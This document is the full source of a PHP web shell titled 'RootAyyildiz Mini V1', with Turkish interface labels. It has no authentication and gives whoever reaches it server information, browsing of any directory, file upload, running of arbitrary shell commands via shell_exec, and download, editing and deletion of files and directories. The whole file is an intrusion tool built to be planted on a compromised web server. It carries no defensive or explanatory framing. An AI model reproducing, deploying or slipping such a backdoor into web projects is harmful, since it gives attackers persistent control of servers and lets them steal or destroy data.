<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(0);

$ip_adresi = $_SERVER['SERVER_ADDR'];
$isletim_sistemi = php_uname();
$php_surum = phpversion();

if (isset($_POST['indir'])) {
    $dosya = $_POST['indir'];
    $dosya_yolu = getcwd() . '/' . $dosya;
    if (file_exists($dosya_yolu)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename='.basename($dosya_yolu));
        header('Content-Length: ' . filesize($dosya_yolu));
        readfile($dosya_yolu);
        exit;
    } else {
        echo '<p style="color:red;">Dosya bulunamadi!</p>';
    }
}

echo '<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>RootAyyildiz Mini V1</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1e1e1e;
            color: #cfcfcf;
            margin: 0;
            padding: 0;
        }
        h1 {
            color: #00ff00;
        }
        .container {
            width: 90%;
            margin: 50px auto;
            padding: 20px;
            background-color: #2e2e2e;
            border-radius: 10px;
        }
        table {
            width: 100%;
            margin: 20px 0;
            border-collapse: collapse;
            background-color: #333;
            color: #cfcfcf;
        }
        table, th, td {
            border: 1px solid #555;
        }
        th, td {
            padding: 10px;
            text-align: center;
        }
        th {
            background-color: #444;
            color: #00ff00;
        }
        a {
            color: #00ff00;
            text-decoration: none;
        }
        a:hover {
            color: #cfcfcf;
        }
        input[type="submit"], button {
            background-color: #333;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            margin: 10px;
            border-radius: 50px;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover, button:hover {
            background-color: #555;
        }
        .upload-form, .command-form {
            margin: 20px 0;
        }
        .delete-btn, .edit-btn, .download-btn {
            background-color: #333;
            padding: 10px 15px;
            border-radius: 50px;
            color: white;
            cursor: pointer;
            border: none;
        }
        .delete-btn:hover {
            background-color: #ff5555;
        }
        .edit-btn {
            background-color: #5555ff;
        }
        .edit-btn:hover {
            background-color: #3333cc;
        }
        .download-btn {
            background-color: #55ff55;
        }
        .download-btn:hover {
            background-color: #33cc33;
        }
        .info-box {
            width: 100%;
            background-color: #2e2e2e;
            color: #00ff00;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

<div class="info-box">
    <strong>Sunucu Bilgileri</strong><br>
    Isletim Sistemi: ' . $isletim_sistemi . '<br>
    IP Adresi: ' . $ip_adresi . '<br>
    PHP Surumu: ' . $php_surum . '<br>
</div>

<div class="container">
    <h1>RootAyyildiz Mini V1</h1>
    <table>
        <tr>
            <th>Bulundugun Dizin</th>
        </tr>
        <tr>
            <td>';

$mevcut_dizin = isset($_GET['yol']) ? $_GET['yol'] : getcwd();
$mevcut_dizin = str_replace('\\', '/', $mevcut_dizin);
$dizinler = explode('/', $mevcut_dizin);

foreach ($dizinler as $id => $dizin) {
    if ($dizin == '' && $id == 0) {
        echo '<a href="?yol=/">/</a>';
        continue;
    }
    if ($dizin == '') continue;
    echo '<a href="?yol=';
    for ($i = 0; $i <= $id; $i++) {
        echo "$dizinler[$i]";
        if ($i != $id) echo "/";
    }
    echo '">' . $dizin . '</a>/';
}

echo '</td>
        </tr>
    </table>';

echo '<div class="upload-form">
        <form enctype="multipart/form-data" method="POST">
            Dosya Yukle: <input type="file" name="yukle" />
            <input type="submit" value="Yukle" />
        </form>
      </div>';

if (isset($_FILES['yukle'])) {
    if (move_uploaded_file($_FILES['yukle']['tmp_name'], $mevcut_dizin . '/' . $_FILES['yukle']['name'])) {
        echo '<p style="color:green;">Dosya Basariyla Yuklendi!</p>';
    } else {
        echo '<p style="color:red;">Dosya Yukleme Basarisiz Oldu!</p>';
    }
}

echo '<div class="command-form">
        <form method="POST">
            Komut: <input type="text" name="komut" placeholder="Komut Girin">
            <input type="submit" value="Calistir">
        </form>
      </div>';

if (isset($_POST['komut'])) {
    $komut = $_POST['komut'];
    echo '<pre>' . shell_exec($komut) . '</pre>';
}

$tarama = scandir($mevcut_dizin);

echo '<table>
        <tr>
            <th>Ad</th>
            <th>Boyut</th>
            <th>Izinler</th>
            <th>Islemler</th>
        </tr>';

foreach ($tarama as $eleman) {
    if (is_dir($mevcut_dizin . '/' . $eleman)) {
        echo "<tr>
                <td><a href=\"?yol=$mevcut_dizin/$eleman\">$eleman</a></td>
                <td>--</td>
                <td>" . izinler($mevcut_dizin . '/' . $eleman) . "</td>
                <td>
                    <form method=\"POST\" style=\"display:inline;\">
                        <input type=\"hidden\" name=\"eleman\" value=\"$mevcut_dizin/$eleman\">
                        <button type=\"submit\" name=\"sil\" value=\"dizin\" class=\"delete-btn\">Sil</button>
                    </form>
                </td>
              </tr>";
    }
}

foreach ($tarama as $eleman) {
    if (is_file($mevcut_dizin . '/' . $eleman)) {
        $boyut = filesize($mevcut_dizin . '/' . $eleman) / 1024;
        $boyut = round($boyut, 2) . ' KB';
        echo "<tr>
                <td><a href=\"?dosya=$mevcut_dizin/$eleman&yol=$mevcut_dizin\">$eleman</a></td>
                <td>$boyut</td>
                <td>" . izinler($mevcut_dizin . '/' . $eleman) . "</td>
                <td>
                    <form method=\"POST\" style=\"display:inline;\">
                        <input type=\"hidden\" name=\"eleman\" value=\"$mevcut_dizin/$eleman\">
                        <button type=\"submit\" name=\"indir\" value=\"$eleman\" class=\"download-btn\">Indir</button>
                        <button type=\"submit\" name=\"duzenle\" value=\"$eleman\" class=\"edit-btn\">Duzenle</button>
                        <button type=\"submit\" name=\"sil\" value=\"dosya\" class=\"delete-btn\">Sil</button>
                    </form>
                </td>
              </tr>";
    }
}

echo '</table>';

if (isset($_POST['duzenle'])) {
    $dosya_yolu = $mevcut_dizin . '/' . $_POST['duzenle'];
    $icerik = file_get_contents($dosya_yolu);
    echo '<form method="POST">
            <textarea name="icerik" rows="20" cols="100">' . htmlspecialchars($icerik) . '</textarea>
            <input type="hidden" name="dosya_yolu" value="' . $dosya_yolu . '">
            <input type="submit" value="Kaydet">
          </form>';
}

if (isset($_POST['icerik']) && isset($_POST['dosya_yolu'])) {
    file_put_contents($_POST['dosya_yolu'], $_POST['icerik']);
    echo '<p style="color:green;">Dosya Basariyla Kaydedildi!</p>';
}

if (isset($_POST['sil'])) {
    $eleman_yolu = $_POST['eleman'];
    if ($_POST['sil'] == 'dosya') {
        if (unlink($eleman_yolu)) {
            echo "<p style=\"color:green;\">Dosya Basariyla Silindi!</p>";
        } else {
            echo "<p style=\"color:red;\">Dosya Silinirken Hata Olustu!</p>";
        }
    } elseif ($_POST['sil'] == 'dizin') {
        if (rmdir($eleman_yolu)) {
            echo "<p style=\"color:green;\">Dizin Basariyla Silindi!</p>";
        } else {
            echo "<p style=\"color:red;\">Dizin Silinirken Hata Olustu!</p>";
        }
    }
}

echo '</div>
</body>
</html>';

function izinler($eleman) {
    $izinler = fileperms($eleman);
    $bilgi = '';

    if (($izinler & 0xC000) == 0xC000) {
        $bilgi = 's';
    } elseif (($izinler & 0xA000) == 0xA000) {
        $bilgi = 'l';
    } elseif (($izinler & 0x8000) == 0x8000) {
        $bilgi = '-';
    } elseif (($izinler & 0x6000) == 0x6000) {
        $bilgi = 'b';
    } elseif (($izinler & 0x4000) == 0x4000) {
        $bilgi = 'd';
    } elseif (($izinler & 0x2000) == 0x2000) {
        $bilgi = 'c';
    } elseif (($izinler & 0x1000) == 0x1000) {
        $bilgi = 'p';
    } else {
        $bilgi = 'u';
    }

    $bilgi .= (($izinler & 0x0100) ? 'r' : '-');
    $bilgi .= (($izinler & 0x0080) ? 'w' : '-');
    $bilgi .= (($izinler & 0x0040) ? (($izinler & 0x0800) ? 's' : 'x') : (($izinler & 0x0800) ? 'S' : '-'));
    $bilgi .= (($izinler & 0x0020) ? 'r' : '-');
    $bilgi .= (($izinler & 0x0010) ? 'w' : '-');
    $bilgi .= (($izinler & 0x0008) ? (($izinler & 0x0400) ? 's' : 'x') : (($izinler & 0x0400) ? 'S' : '-'));
    $bilgi .= (($izinler & 0x0004) ? 'r' : '-');
    $bilgi .= (($izinler & 0x0002) ? 'w' : '-');
    $bilgi .= (($izinler & 0x0001) ? (($izinler & 0x0200) ? 't' : 'x') : (($izinler & 0x0200) ? 'T' : '-'));

    return $bilgi;
}
?>
